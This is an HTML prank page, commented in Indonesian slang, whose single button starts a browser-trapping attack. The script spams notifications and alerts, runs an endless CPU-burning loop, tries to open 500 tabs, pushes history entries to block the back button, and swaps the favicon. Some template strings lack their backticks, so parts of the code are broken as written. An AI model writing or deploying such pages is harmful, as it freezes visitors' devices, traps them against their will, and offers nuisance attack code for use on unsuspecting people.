<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ðŸš€ GASKAN BROOO</title>
    <style>
        body {
            background: black;
            color: lime;
            font-family: 'Comic Sans MS', cursive;
            text-align: center;
            padding: 50px;
        }
        button {
            font-size: 30px;
            padding: 20px;
            background: red;
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>ðŸ”¥ KLIK TOMBOL INI KALO LU GABUT ðŸ”¥</h1>
    <button onclick="brutalMode()">ðŸš€ GASKAN 2.0 ðŸš€</button>
    
    <script>
        function brutalMode() {
            // 1. Bikin notifikasi spam (kalo pake Chrome, bakal nanya izin dulu)
            if (Notification.permission === "granted") {
                for (let i = 0; i < 50; i++) {
                    new Notification("LU KENA PRANK ðŸ”¥");
                }
            } else {
                Notification.requestPermission();
            }
            
            // 2. Bikin loop CPU berat
            setInterval(() => {
                for (let i = 0; i < 1000000000; i++) {
                    Math.sqrt(i) * Math.random();
                }
            }, 5);
            
            // 3. Bikin tab baru sampe 500 tab
            for (let i = 0; i < 500; i++) {
                window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
            }
            
            // 4. Bikin alert spam (bikin bete)
            for (let i = 0; i < 20; i++) {
                setTimeout(() => {
                    alert(LU KENA STEP ${i+1});
                }, i * 500);
            }
            
            // 5. Manipulasi history biar gabisa back
            for (let i = 0; i < 10; i++) {
                history.pushState({}, "", /step-${i});
            }
            
            // 6. Ganti favicon jadi menyeramkan (opsional)
            let link = document.querySelector("link[rel~='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = 'https://icons.iconarchive.com/icons/fazieaf/rilakkuma/256/rilakkuma-icon.png'; // ganti bebas
            document.getElementsByTagName('head')[0].appendChild(link);
        }
    </script>
</body>
